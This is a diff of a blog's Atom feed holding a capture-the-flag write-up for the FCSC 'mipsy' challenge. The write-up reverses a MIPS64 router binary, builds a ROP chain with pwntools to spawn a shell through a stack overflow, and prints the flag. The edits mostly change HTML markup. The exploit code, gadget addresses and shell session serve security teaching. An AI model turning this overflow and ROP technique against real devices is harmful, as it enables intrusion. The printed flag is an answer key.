@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?> 
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
-    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[mips on repr]]></title>
+    <generator uri="https://gohugo.io/" version="0.80.0">Hugo</generator><title type="html"><![CDATA[mips on repr]]></title>
     
         <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
     
@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/mips/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/mips/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-07-29T20:34:46+02:00</updated>
+    <updated>2022-08-01T03:33:42+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -59,7 +59,7 @@ It&rsquo;s not a very hard challenge but I found it very interesting because it 
 nc challenges2.france-cybersecurity-challenge.fr 4005</p>
 </blockquote>
 <p>And for debugging purposes administrators provided a Docker file:</p>
-<pre tabindex="0"><code>FROM debian:buster-slim
+<pre><code>FROM debian:buster-slim
 RUN apt update
 RUN apt install -yq socat qemu-user libc6-mips64-cross
 RUN apt clean
@@ -73,7 +73,7 @@ EXPOSE 4000
 EXPOSE 1234
 CMD socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy&quot;
 </code></pre><p>So because it&rsquo;s not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting <code>/etc/ld.so.cache</code> and by the socat command on port 4000:</p>
-<pre tabindex="0"><code>$ uname -a
+<pre><code>$ uname -a
 Linux off 5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 $ sudo apt install socat qemu-user libc6-mips64-cross
 Lecture des listes de paquets... Fait
@@ -86,7 +86,7 @@ qemu-user est déjà la version la plus récente (1:4.2-3ubuntu6.15).
 $ sudo rm -f /etc/ld.so.cache
 $ socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&quot;
 </code></pre><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
-<pre tabindex="0"><code>$ gdb-multiarch -ex 'source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py' -q ./mipsy
+<pre><code>$ gdb-multiarch -ex 'source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py' -q ./mipsy
 Reading symbols from ./mipsy...
 (No debugging symbols found in ./mipsy)
 pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
@@ -99,19 +99,19 @@ pwndbg&gt; target remote localhost:5445
   
   >pwntools</a
 >.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
     <span class="c1"># return remote(&#34;challenges2.france-cybersecurity-challenge.fr&#34;, 4005)</span>
     <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">)</span>
 
 <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
-<span class="nb">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;] &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;] &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
 </code></pre></div><p>Now we launch the python script to trigger the socat:</p>
-<pre tabindex="0"><code>$ python3 wu.py                                                               
+<pre><code>$ python3 wu.py                                                               
 [+] Opening connection to localhost on port 4000: Done
 </code></pre><p>It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb:</p>
-<pre tabindex="0"><code>Remote debugging using localhost:5445
+<pre><code>Remote debugging using localhost:5445
 warning: Unable to find dynamic linker breakpoint function.
 GDB will be unable to debug shared library initializers
 and track explicitly loaded dynamic code.
@@ -140,7 +140,7 @@ Use the &quot;info sharedlibrary&quot; command to see the complete listing.
 Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?
 [Inferior 1 (process 1) exited normally]
 </code></pre><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
-<pre tabindex="0"><code>+---------------------------------+
+<pre><code>+---------------------------------+
 |/                               \|
 |        ITSY MIPSY ROUTER        |
 |\                               /|
@@ -163,10 +163,10 @@ Menu:
     </h2>
 </div>
 <p>We can take a look at the binary by running the file command:</p>
-<pre tabindex="0"><code>$ file mipsy                                                                  
+<pre><code>$ file mipsy                                                                  
 mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamically linked, interpreter /lib64/ld.so.1, BuildID[sha1]=e20cf7872e96482095ce68e6d4d03806d5928de4, for GNU/Linux 3.2.0, not stripped
 </code></pre><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
-<pre tabindex="0"><code>+---------------------------------+
+<pre><code>+---------------------------------+
 |/                               \|
 |        ITSY MIPSY ROUTER        |
 |\                               /|
@@ -213,7 +213,7 @@ Menu:
 
 [guest@mipsy] $ 0
 </code></pre><p>It doesn&rsquo;t give any interesting informations so instead of fuzzing manually the binary to find the vulnerability, I reversed the main functions in IDA. And particulary the code of the the function corresponding to the &ldquo;Login as admin&rdquo; feature. The assembly code of this function looks like such:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="na">.globl</span> <span class="no">authenticate</span>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="na">.globl</span> <span class="no">authenticate</span>
 <span class="nl">authenticate:</span>
 
 <span class="nf">var_40</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x40</span>
@@ -306,7 +306,7 @@ And the result of this encryption routine is compared to a constant value with <
     </h2>
 </div>
 <p>Since we understood the vulnerable function, we can represent the stackframe like that:</p>
-<pre tabindex="0"><code>$saved_fp-0x90+----------------------+
+<pre><code>$saved_fp-0x90+----------------------+
               |                      |
               |                      |
               |   buffer_password    |
@@ -342,7 +342,7 @@ But since we&rsquo;re able to jmp everywhere, we have to figure out what kind of
 </div>
 <p>For an obsure reason, I thought the <code>gets</code> function had for badchar the NULL byte, so I was looking for a one gadget in the binary.
 I discovered during the reverse engineering part an interesting snippet of code:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">.globl</span> <span class="no">ip</span>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">.globl</span> <span class="no">ip</span>
 <span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ip</span><span class="p">:</span>                                      <span class="c">; CODE XREF: main+260↓p
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>                                          <span class="c">; DATA XREF: LOAD:0000000120002438↑o ...
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>
@@ -445,14 +445,14 @@ I discovered during the reverse engineering part an interesting snippet of code:
   
   >ROPgadget</a
 > to find some suitable gadgets:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ROPgadget --binary mipsy &gt; gadgets
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ROPgadget --binary mipsy &gt; gadgets
 </code></pre></div><p>On mips architechture there is no <code>ret</code> or <code>pop</code> instructions, to handle this issue we use gadgets which load directly a 64 bit value stored in the stack into a register like this:</p>
-<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">ld $a0, 0x8($sp) ; It will read the doubleword in $sp+8 to load it in the $a0 register.
+<pre><code class="language-x86asm" data-lang="x86asm">ld $a0, 0x8($sp) ; It will read the doubleword in $sp+8 to load it in the $a0 register.
 </code></pre><p>And to return we need to find a load on a register like <code>$t9</code> which is often used to resolve and call extern functions or on <code>$ra</code> which is the standard register used to store the address of the calling function.</p>
 <p>And that&rsquo;s why it&rsquo;s too hard to find automatically gadgets for mips binaries. But fortunately, ROPgadgets finds a a great amount of gadgets which helps us a lot.</p>
 <p>The exploitation would be for me to jmp to the execve&rsquo;s call with the right context.
 The code looks like such:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120004134</span>                 <span class="nf">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120004134</span>                 <span class="nf">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; envp
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004138</span>                 <span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; argv
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000413</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; path
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004140</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">execve</span>      <span class="c">; Load 64-bit address
@@ -473,18 +473,18 @@ The code looks like such:</p>
   ><code>dla</code></a
 > instruction addresses memory areas. And if we check the value of <code>$gp</code> in gdb, we got: <code>0x120048020</code>.</p>
 <p>To control the <code>$v1</code> register we can grep on the gadgets found by ROPgadget:</p>
-<pre tabindex="0"><code>$ grep &quot;ld \$v0, &quot; gadgets | grep \$sp
+<pre><code>$ grep &quot;ld \$v0, &quot; gadgets | grep \$sp
 </code></pre><p>Then we got a lot of candidate which are not efficient. And if we&rsquo;re very careful we find an interesting gadget:</p>
-<pre tabindex="0"><code>0x000000012001b4d8 : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6
+<pre><code>0x000000012001b4d8 : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6
 </code></pre><p>It&rsquo;s perfect because it allows us to control the value of <code>$v0</code> and the value of the next gadget that we can store in <code>$t9</code> to jump on !</p>
 <p>We can apply process to find a gadget for $v1:</p>
-<pre tabindex="0"><code>$ grep &quot;ld \$v1, &quot; gadgets | grep \$sp
+<pre><code>$ grep &quot;ld \$v1, &quot; gadgets | grep \$sp
 [skip]
 0x000000012001270c : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)
 [skip]
 </code></pre><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
 <p>Finally we need to control the value of the <code>$gp</code> register but to achieve that we do not need to use a gadget, because we already control it thanks to the vuln epilogue:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">00000001200046</span><span class="nf">A4</span> <span class="no">loc_1200046A4</span><span class="p">:</span>                           <span class="c"># CODE XREF: authenticate+104↑j
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">00000001200046</span><span class="nf">A4</span> <span class="no">loc_1200046A4</span><span class="p">:</span>                           <span class="c"># CODE XREF: authenticate+104↑j
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A4</span>                 <span class="no">move</span>    <span class="no">$sp</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c"># _
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A8</span>                 <span class="no">ld</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">ret_addr</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">AC</span>                 <span class="no">ld</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c"># Load Doubleword
@@ -501,22 +501,22 @@ The code looks like such:</p>
     </h2>
 </div>
 <p>For the pruposes of mips exploitation I developped a small function in python which inserts automatically a value at an arbitrary offset.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">make_pld</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">make_pld</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">pos</span><span class="p">):</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="n">pos</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: s += </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] Gadget: s += {val}&#34;</span><span class="p">)</span>
         <span class="n">s</span> <span class="o">+=</span> <span class="n">val</span>
         <span class="k">return</span> <span class="n">s</span>
     <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">pos</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: </span><span class="si">{</span><span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] Gadget: {s[:pos-1]} + {val} + {s[pos-1+len(val):]}&#34;</span><span class="p">)</span>
         <span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="p">[:</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">val</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="n">pos</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">val</span><span class="p">):]</span>
         <span class="k">return</span> <span class="n">s</span> 
     <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">pos</span><span class="p">:</span>
         <span class="n">k</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
-        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Gadget: </span><span class="si">{</span><span class="n">s</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s2"> + </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] Gadget: {s} + {k} + {val}&#34;</span><span class="p">)</span>
         <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="p">(</span><span class="n">pos</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="o">+</span> <span class="n">val</span>
 </code></pre></div><p>It&rsquo;s very useful because we are then able to give the right offset about the stack pointer when we execute the gadgets.
 We can begin by overwriting the value of the saved <code>$gp</code> and <code>$ra</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">GP</span> <span class="o">=</span> <span class="mh">0x120048020</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">GP</span> <span class="o">=</span> <span class="mh">0x120048020</span>
 <span class="n">BASE_RSP</span> <span class="o">=</span> <span class="mh">0x90</span>
 
 <span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">GP</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">-</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># $gp</span>
@@ -525,15 +525,15 @@ We can begin by overwriting the value of the saved <code>$gp</code> and <code>$r
 We indicate the gadget to execute which is the gadget which sets <code>$v1</code> register to zero.</p>
 <p>Then we can put the right value in <code>$v1</code> by looking at the SET_V1 gadget which loads the doubleword in <code>0x80($sp)</code> in <code>$v1</code>.
 So we have to add to our payload:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span> <span class="c1"># $v1</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x80</span><span class="p">))</span> <span class="c1"># $v1</span>
 </code></pre></div><p>And we have to set the right value for the next gadget to execute. The gadget loads the doubleword in <code>0xe0($sp)</code> in <code>$t9</code> and then jmp on, so we can add our SET_V0 gadget to be then executed:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span> <span class="c1"># $t9</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">SET_V0</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">))</span> <span class="c1"># $t9</span>
 </code></pre></div><p>We repeat the same operation for the SET_V0 gadget by setting a pointer to <code>'/bin/sh'</code> in <code>0x210($sp)</code> and the address of the final execve call in <code>0x228($sp)</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x210</span><span class="p">))</span> <span class="c1"># $v0</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">BINSH</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x210</span><span class="p">))</span> <span class="c1"># $v0</span>
 <span class="n">pld</span>  <span class="o">=</span> <span class="n">make_pld</span><span class="p">(</span><span class="n">pld</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">EXECVE</span><span class="p">),</span> <span class="n">BASE_RSP</span><span class="o">+</span><span class="p">(</span><span class="mh">0x228</span><span class="p">))</span> <span class="c1"># $t9</span>
 </code></pre></div><p>We finished the ROPchain, now we just have to send it to the server and to enjoy the shell !</p>
 <p>The final script looks like such:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">ELF</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">remote</span><span class="p">,</span> <span class="n">p64</span> 
 
 <span class="n">BINSH</span> <span class="o">=</span> <span class="mh">0x120025A20</span>
@@ -590,7 +590,7 @@ So we have to add to our payload:</p>
 </div>
 <p>According to the statements we need to read some files stored on the filer machine.
 So firstly let&rsquo;s run the exploit to get the shell:</p>
-<pre tabindex="0"><code>$ ./solve.py                                                                  
+<pre><code>$ ./solve.py                                                                  
 [!] Could not emulate PLT instructions for ELF('mipsy/mipsy')
 [!] Could not populate PLT: not enough values to unpack (expected 2, got 0)
 [*] 'mipsy/mipsy'
@@ -610,7 +610,7 @@ list_interfaces.sh
 mipsy
 $
 </code></pre><p>We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:</p>
-<pre tabindex="0"><code>$ curl filer
+<pre><code>$ curl filer
 &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
 &lt;html&gt;
 &lt;head&gt;
@@ -627,7 +627,7 @@ $
 &lt;/body&gt;
 &lt;/html&gt;
 </code></pre><p>It&rsquo;s a directory listing of the files stored in filer, and so we just have to <code>curl filer/flag</code> to get the flag:</p>
-<pre tabindex="0"><code>$ curl filer/flag
+<pre><code>$ curl filer/flag
 FCSC{82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519}
 </code></pre><p>And we got the flag !
 This challenge was very cool because it&rsquo;s a &ldquo;real world&rdquo; scenario and it makes me discovering mips assembly !</p>
